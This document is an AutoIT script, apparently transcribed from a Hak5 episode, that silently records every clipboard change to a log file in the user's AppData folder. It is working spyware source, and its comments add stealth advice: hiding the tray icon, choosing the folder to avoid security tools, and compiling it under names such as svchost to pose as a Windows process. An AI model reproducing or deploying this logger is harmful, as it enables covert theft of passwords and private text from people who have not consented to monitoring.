; The Mubix Clipboard keylogger
; Programmed in AutoIT
; As seen in Hak5 episode 1020 Originally airing January 4, 2012
; Transcribed by MrSchism Jan 11, 2012
; Modified by MrSchism Jan 11, 2012
; Comprehensive commenting by Josh "MrSchism" Embrey -
; May 9, 2012


#NoTrayIcon                                                     ; Disables the AutoIT tray icon.
#include <Clipboard.au3>                                        ; Includes the clipboard.au3 premade function to handle clipboard information
#include <File.au3>                                             ; Includes the file.au3 premade function to create files

$oldclip = ""                                                   ; Starts "old clip" variable as blank
While 1                                                         ; Begins a While statement
   $clip = _Clipboard_Getdata()                                 ; "Clip" variable is defined as the procedure for getting clipboard data
     If $clip <> "0" Then                                       ; If the clipboard is not blank...
        If $clip <> $oldclip Then                               ; ...and the value of the clipboard ("clip") is not the same as the value of "oldclip"...
            _FileWriteLog(@AppDataDir & "\clip.log", $clip)     ; ...write the value of "clip" to %AppData% in a file called "clip.log"...
            $oldclip = $clip                                    ; ...then define the value of "clip" as "oldclip".
        EndIf                                                   ; Ends the if statement regarding writing the data to the log.
     EndIf                                                      ; Ends the first if statement regarding if the "clip" value is empty.
     Sleep(100)                                                 ; Waits for 100 miliseconds before checking again to reduce processor use.
WEnd                                                            ; Ends the While statement

                                                                ; Changes and Explanations.
                                                                ; Originally, the @UserProfileDir directory was used instead of @AppDataDir.
                                                                ; This was changed in order to improve backwards compatability with systems as
                                                                ; old as WinNT4 as well as to have superior ease of access and avoidance of security.
                                                                ; @AppDataDir is used for many programs to store their generated settings --
                                                                ; @UserProfileDir is the directory that contains @AppDataDir.
                                                               
                                                                ; Another change was adding the include "#NoTrayIcon" which prevents the AutoIT tray icon
                                                                ; from appearing while the script is running. 
                                                                ; Suggested compiled names include svchost, svchost64, and system32 (if you need to  
                                                                ; remember which process is the logger).
